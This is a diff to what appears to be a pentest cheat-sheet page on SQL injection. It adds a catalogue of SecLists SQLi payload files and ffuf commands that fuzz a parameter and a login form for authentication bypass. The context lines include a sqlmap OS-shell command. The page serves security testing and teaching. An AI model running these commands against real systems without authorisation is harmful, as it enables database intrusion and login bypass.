@@ -243,6 +243,32 @@ SELECT * FROM cmd;
 # sqlmap OS shell:
 sqlmap -u "URL" --os-shell --technique=BEUSTQ</code></pre>
 
+  <h2>SecLists SQL Payload Files</h2>
+  <p>Use these lists with sqlmap <code>--string</code> tests, ffuf, or Burp Intruder. See <a href="/web/fuzzing-payloads/">Web Fuzzing Payloads</a> for full usage detail.</p>
+  <pre><code># /usr/share/seclists/Fuzzing/Databases/SQLi/
+#
+# quick-SQLi.txt                   77  — fast detection probe (start here)
+# Generic-SQLi.txt                268  — broad all-engine coverage
+# Generic-BlindSQLi.fuzzdb.txt     42  — time-based and boolean blind
+# sqli.auth.bypass.txt             96  — login form bypass payloads
+# SQLi-Polyglots.txt                3  — multi-context single payload
+# MySQL.fuzzdb.txt                  6  — MySQL-specific
+# MySQL-SQLi-Login-Bypass.fuzzdb.txt  8  — MySQL login bypass
+# MSSQL.fuzzdb.txt                 17  — SQL Server stacked / xp_cmdshell
+# Oracle.fuzzdb.txt                55  — Oracle-specific
+# NoSQL.txt                        22  — MongoDB operator injection
+
+# Quick detection with ffuf:
+ffuf -u "https://target.com/item?id=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/Databases/SQLi/quick-SQLi.txt \
+  -fs [baseline_size] -ac -mc all
+
+# Login bypass:
+ffuf -u https://target.com/login -X POST \
+  -d "username=admin&password=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt \
+  -fr "Invalid\|incorrect"</code></pre>
+
   <h2>Tools &amp; Resources</h2>
   <ul>
     <li><code>sqlmap</code> — <code>github.com/sqlmapproject/sqlmap</code></li>
@@ -250,4 +276,5 @@ sqlmap -u "URL" --os-shell --technique=BEUSTQ</code></pre>
     <li>PortSwigger SQLi labs — <code>portswigger.net/web-security/sql-injection</code></li>
     <li>PayloadsAllTheThings — <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
     <li>HackTricks SQLi — <code>book.hacktricks.xyz/pentesting-web/sql-injection</code></li>
+    <li>SecLists SQLi payloads — <a href="/web/fuzzing-payloads/">Web Fuzzing Payloads</a></li>
   </ul>
